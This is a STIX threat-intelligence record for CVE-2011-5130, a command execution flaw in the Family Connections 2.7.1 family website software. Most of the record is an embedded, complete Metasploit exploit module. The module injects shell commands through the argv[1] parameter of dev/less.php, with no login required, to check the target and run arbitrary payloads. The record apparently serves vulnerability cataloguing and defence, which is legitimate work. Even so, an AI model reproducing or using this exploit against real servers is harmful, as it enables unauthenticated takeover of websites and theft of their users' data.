{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--6a41a263-63fa-4319-82be-4c6592c48026",
    "created": "2024-08-14T17:10:30.27255Z",
    "modified": "2024-08-14T17:10:30.272554Z",
    "name": "Family Connections less.php Remote Command Execution",
    "description": " This module exploits an arbitrary command execution vulnerability in Family Connections 2.7.1. It's in the dev/less.php script and is due to an insecure use of system().  Authentication isn't required to exploit the vulnerability but register_globals must be set to On.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/familycms_less_exec.rb",
            "external_id": "familycms_less_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2011-5130"
        },
        {
            "source_name": "reference",
            "url": "https://www.familycms.com/blog/2011/11/security-vulnerability-fcms-2-5-2-7-1/"
        },
        {
            "source_name": "reference",
            "url": "http://sourceforge.net/apps/trac/fam-connections/ticket/407"
        },
        {
            "source_name": "reference",
            "url": "http://rwx.biz.nf/advisories/fc_cms_rce_adv.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => 'Family Connections less.php Remote Command Execution',\n      'Description'    => %q{\n        This module exploits an arbitrary command execution vulnerability in\n        Family Connections 2.7.1. It's in the dev/less.php script and is due\n        to an insecure use of system().  Authentication isn't required to exploit\n        the vulnerability but register_globals must be set to On.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'mr_me <steventhomasseeley[at]gmail.com>', # Vulnerability discovery and exploit\n          'juan vazquez'  # Metasploit module\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2011-5130' ],\n          [ 'OSVDB', '77492' ],\n          [ 'URL', 'https://www.familycms.com/blog/2011/11/security-vulnerability-fcms-2-5-2-7-1/' ],\n          [ 'URL', 'http://sourceforge.net/apps/trac/fam-connections/ticket/407' ],\n          [ 'URL', 'http://rwx.biz.nf/advisories/fc_cms_rce_adv.html' ],\n          [ 'EDB', '18198' ]\n        ],\n      'Privileged'     => false,\n      'Payload'        =>\n        {\n          'Compat'     =>\n          {\n            'PayloadType'  => 'cmd',\n            'RequiredCmd'  => 'generic telnet perl ruby python',\n          }\n        },\n      'Platform'       => %w{ linux unix },\n      'Arch'           => ARCH_CMD,\n      'Targets'        => [['Automatic',{}]],\n      'DisclosureDate' => '2011-11-29',\n      'DefaultTarget'  => 0\n    ))\n\n    register_options(\n      [\n        OptString.new('URI', [true, \"The path to the Family Connections main site\", \"/fcms/\"]),\n      ])\n  end\n\n  def check\n    uri = normalize_uri(datastore['URI'])\n    uri += (normalize_uri(datastore['URI'])[-1, 1] == \"/\") ? \"dev/less.php\" : \"/dev/less.php\"\n\n    mark = Rex::Text.rand_text_alpha(rand(5) + 5)\n\n    res = send_request_cgi({\n      'uri'       => uri,\n      'vars_get'  => { 'argv[1]' => \"|echo #{mark};#\" }\n    }, 25)\n\n    if res and res.code == 200 and res.body =~ /#{mark}/\n      return Exploit::CheckCode::Vulnerable\n    end\n\n    return Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    uri = normalize_uri(datastore['URI'])\n    uri += (normalize_uri(datastore['URI'])[-1, 1] == \"/\") ? \"dev/less.php\" : \"/dev/less.php\"\n\n    start_mark = Rex::Text.rand_text_alpha(rand(5) + 5)\n    end_mark  = Rex::Text.rand_text_alpha(rand(5) + 5)\n    custom_payload = \"|echo #{start_mark};#{payload.encoded};echo #{end_mark};#\"\n\n    res = send_request_cgi({\n      'uri'       => uri,\n      'vars_get'  => { 'argv[1]' => custom_payload }\n    }, 25)\n\n    if res and res.code == 200 and res.body =~ /#{start_mark}/\n      # Prints output when using cmd/unix/generic\n      result = res.body.split(/#{start_mark}/)[1].split(/#{end_mark}/)[0]\n      if not result.strip.empty?\n        print_status(\"Result of the command:\\n#{result}\")\n      end\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2011-11-29",
    "x_mitre_platforms": [
        "%w{ linux unix }"
    ]
}